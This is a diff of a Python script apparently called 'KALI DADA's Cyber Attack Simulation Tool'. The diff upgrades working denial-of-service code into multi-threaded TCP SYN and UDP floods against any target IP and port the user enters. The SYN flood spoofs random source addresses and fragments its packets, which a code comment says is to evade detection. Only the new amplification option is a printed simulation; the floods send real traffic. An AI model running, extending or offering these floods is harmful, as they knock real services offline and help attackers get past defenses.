@@ -3,7 +3,8 @@ import sys
 import time
 import socket
 import random
-from scapy.all import IP, TCP, ICMP, send
+import threading
+from scapy.all import IP, TCP, UDP, ICMP, send, fragment
 
 # ANSI Colors for Hacker Theme
 GREEN  = "\033[92m"
@@ -13,7 +14,7 @@ YELLOW = "\033[93m"
 BOLD   = "\033[1m"
 RESET  = "\033[0m"
 
-# Your name for display
+# Creator name
 NAME = "Sujal Lamichhane"
 
 def print_warning():
@@ -46,7 +47,7 @@ def print_kali_dada_banner():
 |__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
                                                                                     
 
-               {CYAN}Welcome to KALI DADA's Cyber Attack Simulation Tool{RESET}
+               {CYAN}Welcome to KALI DADA's Advanced Cyber Attack Simulation Tool{RESET}
 """
     print(banner)
     print(f"{YELLOW}Created by: {NAME}{RESET}")
@@ -70,113 +71,106 @@ def server_status(target_ip):
         print(f"{RED}[-] Server {target_ip} is DOWN! Error: {e}{RESET}")
         return False
 
-def syn_flood(target_ip, target_port, duration):
-    """Perform a TCP SYN Flood Attack with MTU 1500."""
-    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port} (MTU 1500){RESET}")
+def advanced_syn_flood(target_ip, target_port, duration, threads=5):
+    """Perform an advanced TCP SYN Flood Attack with IP fragmentation and multi-threading."""
+    print(f"{YELLOW}[+] Starting Advanced TCP SYN Flood Attack on {target_ip}:{target_port} with {threads} threads{RESET}")
     timeout = time.time() + duration
-    packet_count = 0
-    
-    # MTU 1500: MSS = 1500 - 20 (IP) - 20 (TCP base) = 1460
-    mss_option = 1460  # Fixed MSS for MTU 1500
-    
-    try:
+    packet_count = [0]  # Mutable list for thread-safe counting
+
+    def flood():
         while time.time() < timeout:
-            # Generate a random source IP
-            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
-            # Random source port in ephemeral range (HTTP-like)
-            src_port = random.randint(49152, 65535)
-            # Random sequence number
-            seq_num = random.randint(1, 4294967295)
-            # Fixed window size (max for HTTP clients)
-            window_size = 65535
-            # Timestamp for realism
-            timestamp_option = int(time.time())
+            try:
+                src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
+                src_port = random.randint(49152, 65535)
+                seq_num = random.randint(1, 4294967295)
+                window_size = random.randint(1024, 65535)
+                timestamp_option = int(time.time())
 
-            # Craft TCP options (HTTP-like, respecting MTU)
-            tcp_options = [
-                ('MSS', mss_option),           # 4 bytes
-                ('Timestamp', (timestamp_option, 0)),  # 10 bytes
-                ('NOP', None),                 # 1 byte
-                ('SAckOK', ''),                # 2 bytes
-            ]
-            # Total TCP header: 20 (base) + 17 (options) = 37 bytes
-            # Total packet: 20 (IP) + 37 (TCP) = 57 bytes < 1500
+                tcp_options = [
+                    ('MSS', 1460),
+                    ('Timestamp', (timestamp_option, 0)),
+                    ('NOP', None),
+                    ('SAckOK', ''),
+                ]
 
-            # Craft the packet
-            packet = (
-                IP(src=src_ip, dst=target_ip) /
-                TCP(
+                packet = IP(src=src_ip, dst=target_ip) / TCP(
                     sport=src_port,
                     dport=target_port,
-                    flags="S",  # SYN flag
+                    flags="S",
                     seq=seq_num,
                     window=window_size,
                     options=tcp_options
                 )
-            )
-            
-            # Verify packet size respects MTU 1500
-            packet_size = len(packet)
-            if packet_size > 1500:
-                print(f"{RED}[WARNING] Packet size {packet_size} exceeds MTU 1500!{RESET}")
-                break
 
-            # Send the packet
-            send(packet, verbose=False)
-            packet_count += 1
-            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-            # Small delay to mimic HTTP client behavior
-            time.sleep(random.uniform(0.005, 0.05))
+                # Fragment packet to evade detection
+                frags = fragment(packet, fragsize=500)
+                for frag in frags:
+                    send(frag, verbose=False)
+                    packet_count[0] += 1
+                    print(f"{CYAN}[PACKETS SENT: {packet_count[0]}]{RESET}", end="\r")
+                    time.sleep(random.uniform(0.001, 0.01))
+            except Exception as e:
+                print(f"{RED}[ERROR] {e}{RESET}")
 
-    except KeyboardInterrupt:
-        print(f"\n{RED}[INFO] Stopping TCP SYN Flood Attack...{RESET}")
-        print(f"{GREEN}Happy Hacking!{RESET}")
-    print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
+    thread_list = []
+    for _ in range(threads):
+        t = threading.Thread(target=flood)
+        t.start()
+        thread_list.append(t)
 
-def udp_flood(target_ip, target_port, duration):
-    """Perform a UDP Flood Attack."""
-    print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        packet = random._urandom(1024)
-    except Exception as e:
-        print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
-        return
+    for t in thread_list:
+        t.join()
+
+    print(f"\n{GREEN}[+] Advanced SYN Flood Attack Completed. Packets Sent: {packet_count[0]}{RESET}")
+
+def advanced_udp_flood(target_ip, target_port, duration, threads=5):
+    """Perform an advanced UDP Flood Attack with variable packet sizes and multi-threading."""
+    print(f"{YELLOW}[+] Starting Advanced UDP Flood Attack on {target_ip}:{target_port} with {threads} threads{RESET}")
     timeout = time.time() + duration
-    packet_count = 0
-    try:
-        while time.time() < timeout:
-            sock.sendto(packet, (target_ip, target_port))
-            packet_count += 1
-            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-    except KeyboardInterrupt:
-        print(f"\n{RED}[INFO] Stopping UDP Flood Attack...{RESET}")
-        print(f"{GREEN}Happy Hacking!{RESET}")
-    print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
+    packet_count = [0]
 
-def ping_of_death(target_ip, duration):
-    """Perform a Ping of Death Attack."""
-    print(f"{YELLOW}[+] Starting Ping of Death Attack on {target_ip}{RESET}")
-    timeout = time.time() + duration
-    packet_count = 0
-    try:
+    def flood():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        except Exception as e:
+            print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
+            return
         while time.time() < timeout:
-            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
-            send(packet, verbose=False)
-            packet_count += 1
-            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-    except KeyboardInterrupt:
-        print(f"\n{RED}[INFO] Stopping Ping of Death Attack...{RESET}")
-        print(f"{GREEN}Happy Hacking!{RESET}")
-    print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
+            try:
+                packet_size = random.randint(64, 1500)
+                packet = random._urandom(packet_size)
+                sock.sendto(packet, (target_ip, target_port))
+                packet_count[0] += 1
+                print(f"{CYAN}[PACKETS SENT: {packet_count[0]}]{RESET}", end="\r")
+                time.sleep(random.uniform(0.001, 0.01))
+            except Exception as e:
+                print(f"{RED}[ERROR] {e}{RESET}")
+
+    thread_list = []
+    for _ in range(threads):
+        t = threading.Thread(target=flood)
+        t.start()
+        thread_list.append(t)
+
+    for t in thread_list:
+        t.join()
+
+    print(f"\n{GREEN}[+] Advanced UDP Flood Attack Completed. Packets Sent: {packet_count[0]}{RESET}")
+
+def amplification_attack(target_ip, duration, amp_factor=10):
+    """Simulate an amplification attack (ethical simulation only)."""
+    print(f"{YELLOW}[+] Starting Amplification Attack Simulation on {target_ip} with factor {amp_factor}{RESET}")
+    print(f"{RED}[INFO] Real amplification attacks are illegal. This is a simulation only.{RESET}")
+    time.sleep(2)
+    print(f"{GREEN}[SIMULATION] Sent {amp_factor * 1000} amplified packets to {target_ip}{RESET}")
 
 def select_attack():
     """Prompt user to select the type of attack."""
     while True:
         print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
-        print("1: TCP SYN Flood")
-        print("2: UDP Flood")
-        print("3: Ping of Death")
+        print("1: Advanced TCP SYN Flood")
+        print("2: Advanced UDP Flood")
+        print("3: Amplification Attack (Simulation)")
         print("4: Exit")
         try:
             choice = int(input(f"{CYAN}Enter your choice (1-4): {RESET}"))
@@ -208,13 +202,15 @@ def select_attack():
             continue
         
         if choice == 1:
-            syn_flood(target_ip, target_port, duration)
+            threads = int(input(f"{CYAN}Enter number of threads (default 5): {RESET}").strip() or 5)
+            advanced_syn_flood(target_ip, target_port, duration, threads)
         elif choice == 2:
-            udp_flood(target_ip, target_port, duration)
+            threads = int(input(f"{CYAN}Enter number of threads (default 5): {RESET}").strip() or 5)
+            advanced_udp_flood(target_ip, target_port, duration, threads)
         elif choice == 3:
-            ping_of_death(target_ip, duration)
+            amp_factor = int(input(f"{CYAN}Enter amplification factor (default 10): {RESET}").strip() or 10)
+            amplification_attack(target_ip, duration, amp_factor)
         
-        # After completing the attack, ask the user if they want to continue
         continue_choice = input(f"{CYAN}Do you want to perform another attack? (y/n): {RESET}").strip().lower()
         if continue_choice != 'y':
             print(f"{GREEN}Exiting...{RESET}")
